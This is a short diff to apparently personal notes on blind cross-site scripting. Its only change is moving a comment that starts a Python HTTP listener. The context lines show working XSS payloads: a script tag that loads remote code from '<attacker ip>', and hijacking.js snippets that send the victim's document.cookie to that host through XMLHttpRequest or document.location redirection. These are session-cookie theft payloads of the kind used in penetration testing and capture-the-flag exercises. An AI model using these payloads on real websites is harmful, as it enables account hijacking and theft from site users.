@@ -16,6 +16,7 @@ testing payload
 https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/XSS%20Injection#blind-xss
 
 ```js
+// sudo python3 -m http.server 80
 // remote script
 <script src="http://<attacker ip>"></script>
 // note that html in the front
@@ -31,13 +32,10 @@ hijacking.js
 ```
 
 ```js
-// sudo python3 -m http.server 80
-
 // hijacking.js
 var oReq = new XMLHttpRequest();
 oReq.open('GET', 'http://<attacker ip>/?output='+document.cookie, true);
 oReq.send()
-
 // hijacking.js
 document.location='http://<attacker ip>/?output='+document.cookie;
 // hijacking.js
